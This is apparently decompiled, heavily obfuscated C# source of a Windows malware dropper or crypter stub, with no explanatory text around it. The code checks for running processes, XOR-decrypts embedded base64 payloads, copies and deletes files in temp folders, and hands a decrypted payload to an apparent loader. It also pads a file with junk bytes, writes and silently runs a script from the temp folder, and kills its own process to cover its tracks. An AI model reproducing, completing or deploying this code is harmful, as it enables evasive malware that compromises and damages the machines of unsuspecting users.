using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using JxoY19YEOsWupFpILEd;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ProwxkN4F4ab5Fc8FL;
using RQMXr6r0FfhYpLYrrT;
using rRFQE3UpcGjlUKLn0p;

namespace zu1uyMtXeiudWFxeIP;

internal sealed class echGpNcV4RNHfACQDd
{
	public static void u6PKmTrXk()
	{
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFile(string string_0);

	public static bool LQ8UEKvYu(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		bool result = default(bool);
		while (num < processes.Length)
		{
			Process process = processes[num];
			int num2 = 5;
			if (!eYNfwCNKkC5vBKnSgB())
			{
				goto IL_0079;
			}
			while (true)
			{
				switch (num2)
				{
				case 5:
					break;
				case 0:
				case 1:
				case 4:
					goto end_IL_0048;
				case 6:
					goto IL_0079;
				case 7:
					goto end_IL_0070;
				default:
					return result;
				}
				if (process.ProcessName.StartsWith(string_0))
				{
					num2 = 6;
					if (!eYNfwCNKkC5vBKnSgB())
					{
						break;
					}
					continue;
				}
				num = checked(num + 1);
				num2 = 1;
				if (!lA2w2mUoysyOvgVGh5())
				{
				}
				continue;
				end_IL_0048:
				break;
			}
			continue;
			IL_0079:
			return true;
			continue;
			end_IL_0070:
			break;
		}
		return false;
	}

	[STAThread]
	public static void wQLQA45Gi()
	{
		if (!yKFgbMYoEe3o3mtjpXI.VBMU2eVssp())
		{
			return;
		}
		int try000c_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object executablePath = default(object);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string sourceFileName = default(string);
		string text7 = default(string);
		string s = default(string);
		byte[] byte_ = default(byte[]);
		string text8 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				string text2;
				string text3;
				byte[] array;
				switch (try000c_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0013;
				case 1242:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_000c;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0013;
						case 3:
							goto IL_0021;
						case 4:
							goto IL_0034;
						case 5:
						case 6:
							goto IL_0040;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_006b;
						case 9:
							goto IL_008d;
						case 10:
							goto IL_00b0;
						case 11:
							goto IL_00b5;
						case 12:
							goto IL_00ce;
						case 14:
							goto IL_0126;
						case 13:
						case 15:
						case 16:
							goto IL_0129;
						case 18:
							goto IL_0177;
						case 19:
							goto IL_017a;
						case 20:
							goto IL_0189;
						case 21:
							goto IL_01a1;
						case 17:
						case 22:
						case 23:
						case 24:
							goto IL_01bb;
						case 25:
							goto IL_01de;
						case 26:
							goto IL_01f4;
						case 27:
							goto IL_0203;
						case 28:
							goto IL_021e;
						case 29:
							goto IL_0226;
						case 30:
							goto IL_0243;
						case 31:
							goto IL_027a;
						case 32:
							goto IL_02c8;
						case 33:
							goto IL_02d2;
						case 34:
							goto IL_02eb;
						case 35:
							goto IL_02f8;
						case 37:
							goto IL_0309;
						case 38:
							goto IL_030c;
						case 41:
							goto IL_0327;
						case 42:
							goto IL_032a;
						case 43:
							goto IL_0334;
						case 44:
							goto IL_034d;
						case 45:
							goto IL_035a;
						case 36:
						case 39:
						case 40:
						case 46:
						case 47:
							goto IL_0369;
						case 48:
							goto IL_0378;
						case 49:
						case 50:
							goto IL_0390;
						case 51:
							goto IL_039d;
						case 52:
							goto IL_03b7;
						case 53:
							goto end_IL_000c_2;
						default:
							goto end_IL_000c;
						case 54:
							goto end_IL_000c_3;
						}
						goto default;
					}
					IL_03b7:
					num = 52;
					DeleteFile(Environment.GetEnvironmentVariable(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(167)) + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677831));
					break;
					IL_0013:
					num = 2;
					text = DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(141);
					goto IL_0021;
					IL_0021:
					num = 3;
					if (LQ8UEKvYu(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(154)))
					{
						goto IL_0034;
					}
					goto IL_0040;
					IL_0034:
					num = 4;
					Thread.Sleep(11001);
					goto IL_0040;
					IL_0040:
					num = 6;
					executablePath = Application.get_ExecutablePath();
					goto IL_0049;
					IL_0049:
					num = 7;
					text2 = Environment.GetEnvironmentVariable(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(167)) + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(180);
					goto IL_006b;
					IL_006b:
					num = 8;
					text3 = Environment.GetEnvironmentVariable(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(185)) + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(194);
					goto IL_008d;
					IL_008d:
					num = 9;
					text4 = DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(203) + Path.GetTempPath() + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(203);
					goto IL_00b0;
					IL_00b0:
					num = 10;
					text5 = text5;
					goto IL_00b5;
					IL_00b5:
					num = 11;
					array = BK0cm5HfV(Convert.FromBase64String(text5), DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(204));
					goto IL_00ce;
					IL_00ce:
					num = 12;
					if (!Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(executablePath, (object)(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(203) + text4 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(229)), false), Operators.CompareObjectEqual(executablePath, (object)(Environment.GetEnvironmentVariable(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(167)) + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(262)), false))))
					{
						goto IL_0126;
					}
					goto IL_0129;
					IL_0126:
					num = 14;
					goto IL_0129;
					IL_0129:
					num = 16;
					if (!Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(executablePath, (object)(text4 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(229)), false), Operators.CompareObjectEqual(executablePath, (object)(Environment.GetEnvironmentVariable(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(167)) + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(262)), false))))
					{
						goto IL_0177;
					}
					goto IL_01bb;
					IL_0177:
					num = 18;
					goto IL_017a;
					IL_017a:
					num = 19;
					text6 = DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(347);
					goto IL_0189;
					IL_0189:
					num = 20;
					if (Operators.CompareString(text6, DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(364), false) == 0)
					{
						goto IL_01a1;
					}
					goto IL_01bb;
					IL_01a1:
					num = 21;
					Directory.CreateDirectory(text4 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(385));
					goto IL_01bb;
					IL_01bb:
					num = 24;
					sourceFileName = Environment.GetEnvironmentVariable(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(185)) + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(398);
					goto IL_01de;
					IL_01de:
					num = 25;
					text7 = text4 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(463);
					goto IL_01f4;
					IL_01f4:
					num = 26;
					s = DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(480);
					goto IL_0203;
					IL_0203:
					num = 27;
					byte_ = BK0cm5HfV(Convert.FromBase64String(s), DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677696));
					goto IL_021e;
					IL_021e:
					num = 28;
					VBMath.Randomize();
					goto IL_0226;
					IL_0226:
					num = 29;
					Encoding.GetEncoding(1252).GetBytes(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(480));
					goto IL_0243;
					IL_0243:
					num = 30;
					if (LQ8UEKvYu(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677725)) | LQ8UEKvYu(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677730)) | LQ8UEKvYu(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677735)))
					{
						goto IL_027a;
					}
					goto IL_0327;
					IL_027a:
					num = 31;
					if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(executablePath, (object)(text4 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(229)), false), Operators.CompareObjectEqual(executablePath, (object)(Environment.GetEnvironmentVariable(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(167)) + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(262)), false))))
					{
						goto IL_02c8;
					}
					goto IL_0309;
					IL_02c8:
					num = 32;
					File.Delete(text7);
					goto IL_02d2;
					IL_02d2:
					num = 33;
					File.Delete(text4 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677740));
					goto IL_02eb;
					IL_02eb:
					num = 34;
					File.Copy(sourceFileName, text7, overwrite: true);
					goto IL_02f8;
					IL_02f8:
					num = 35;
					sxsnkrHXvpbw8a0uKq.JT7tLiYVa(byte_, Application.get_ExecutablePath());
					goto IL_0369;
					IL_0309:
					num = 37;
					goto IL_030c;
					IL_030c:
					num = 38;
					QpSpI7RBM(text4 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(229));
					goto IL_0369;
					IL_0327:
					num = 41;
					goto IL_032a;
					IL_032a:
					num = 42;
					File.Delete(text7);
					goto IL_0334;
					IL_0334:
					num = 43;
					File.Delete(text4 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677740));
					goto IL_034d;
					IL_034d:
					num = 44;
					File.Copy(sourceFileName, text7, overwrite: true);
					goto IL_035a;
					IL_035a:
					num = 45;
					sxsnkrHXvpbw8a0uKq.JT7tLiYVa(byte_, Application.get_ExecutablePath());
					goto IL_0369;
					IL_0369:
					num = 47;
					text8 = DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677757);
					goto IL_0378;
					IL_0378:
					num = 48;
					if (Operators.CompareString(text8, DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(364), false) != 0)
					{
					}
					goto IL_0390;
					IL_0390:
					num = 50;
					Thread.Sleep(5000);
					goto IL_039d;
					IL_039d:
					num = 51;
					DeleteFile(text4 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677778));
					goto IL_03b7;
					end_IL_000c_2:
					break;
				}
				num = 53;
				u6PKmTrXk();
				ProjectData.EndApp();
				break;
				end_IL_000c:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try000c_dispatch = 1242;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_000c_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void QpSpI7RBM(string string_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text3 = default(string);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		Stream stream = default(Stream);
		int num5 = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				string text2;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 497:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_004e;
						case 5:
							goto IL_0071;
						case 6:
							goto IL_007e;
						case 7:
							goto IL_008c;
						case 8:
							goto IL_00a0;
						case 9:
							goto IL_00aa;
						case 10:
							goto IL_00b9;
						case 12:
							goto IL_00c2;
						case 11:
							goto IL_00d2;
						case 13:
							goto IL_00e3;
						case 14:
							goto IL_00fe;
						case 15:
							goto IL_0112;
						case 16:
							goto IL_0121;
						case 17:
							goto IL_0146;
						case 18:
							goto IL_0150;
						case 19:
							goto IL_016e;
						case 20:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 21:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_016e:
					num = 19;
					Process.GetCurrentProcess().Kill();
					break;
					IL_0008:
					num = 2;
					text = Environment.GetEnvironmentVariable(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(185)) + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(194);
					goto IL_002b;
					IL_002b:
					num = 3;
					text2 = Environment.GetEnvironmentVariable(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(167)) + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(180);
					goto IL_004e;
					IL_004e:
					num = 4;
					text3 = DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(203) + Path.GetTempPath() + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(203);
					goto IL_0071;
					IL_0071:
					num = 5;
					Thread.Sleep(5000);
					goto IL_007e;
					IL_007e:
					num = 6;
					array = new byte[1048577];
					goto IL_008c;
					IL_008c:
					num = 7;
					array2 = ((ServerComputer)FCNnxkAMkRGjb7ZsC8.smethod_0()).get_FileSystem().ReadAllBytes(string_0);
					goto IL_00a0;
					IL_00a0:
					num = 8;
					stream = File.OpenWrite(string_0);
					goto IL_00aa;
					IL_00aa:
					num = 9;
					stream.Write(array2, 0, array2.Length);
					goto IL_00b9;
					IL_00b9:
					num = 10;
					num5 = 0;
					goto IL_00d2;
					IL_00d2:
					num = 11;
					stream.Write(array, 0, array.Length);
					goto IL_00c2;
					IL_00c2:
					num = 12;
					num5 = checked(num5 + 1);
					if (num5 <= 9)
					{
						goto IL_00d2;
					}
					goto IL_00e3;
					IL_00e3:
					num = 13;
					streamWriter = new StreamWriter(text3 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677936));
					goto IL_00fe;
					IL_00fe:
					num = 14;
					streamWriter.Write(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677961));
					goto IL_0112;
					IL_0112:
					num = 15;
					streamWriter.Write(Environment.NewLine);
					goto IL_0121;
					IL_0121:
					num = 16;
					streamWriter.Write(DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(678002) + text3 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(678019));
					goto IL_0146;
					IL_0146:
					num = 17;
					streamWriter.Dispose();
					goto IL_0150;
					IL_0150:
					num = 18;
					Interaction.Shell(text3 + DvpNOnmtA3NHWcIMFu.VGXYlx2PBu(677936), (AppWinStyle)0, false, -1);
					goto IL_016e;
					end_IL_0000_2:
					break;
				}
				num = 20;
				stream.Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 497;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] BK0cm5HfV(byte[] byte_0, string string_0)
	{
		checked
		{
			byte[] array = new byte[byte_0.Length + 1];
			int num4 = default(int);
			int num5 = default(int);
			int num3 = default(int);
			while (true)
			{
				int num = byte_0[byte_0.Length - 1] ^ 0x70;
				while (true)
				{
					IL_009f:
					byte[] bytes = Encoding.Default.GetBytes(string_0);
					int num2 = 2;
					if (lA2w2mUoysyOvgVGh5())
					{
						goto IL_0031;
					}
					goto IL_0068;
					IL_0068:
					while (true)
					{
						switch (num2)
						{
						case 9:
							break;
						case 8:
							goto IL_002d;
						case 3:
						case 6:
						case 10:
							goto IL_0031;
						case 2:
							num4 = byte_0.Length - 1;
							num5 = 0;
							goto IL_0031;
						case 0:
							if (num3 == string_0.Length - 1)
							{
								break;
							}
							num3++;
							goto IL_002d;
						default:
							num2 = 9;
							if (eYNfwCNKkC5vBKnSgB())
							{
								continue;
							}
							goto IL_002d;
						case 1:
						case 4:
							goto IL_009f;
						case 7:
							goto end_IL_009f;
						case 5:
							goto IL_00cb;
						case 11:
							goto IL_00e8;
						}
						break;
					}
					goto IL_002b;
					IL_002b:
					num3 = 0;
					goto IL_002d;
					IL_002d:
					num5++;
					goto IL_0031;
					IL_0031:
					if (num5 <= num4)
					{
						array[num5] = (byte)(byte_0[num5] ^ num ^ bytes[num3]);
						num2 = 0;
						if (lA2w2mUoysyOvgVGh5())
						{
							goto IL_002b;
						}
						goto IL_0068;
					}
					goto IL_00cb;
					IL_00cb:
					array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
					goto IL_00e8;
					IL_00e8:
					return array;
					continue;
					end_IL_009f:
					break;
				}
			}
		}
	}

	internal static bool eYNfwCNKkC5vBKnSgB()
	{
		return true;
	}

	internal static bool lA2w2mUoysyOvgVGh5()
	{
		return false;
	}
}
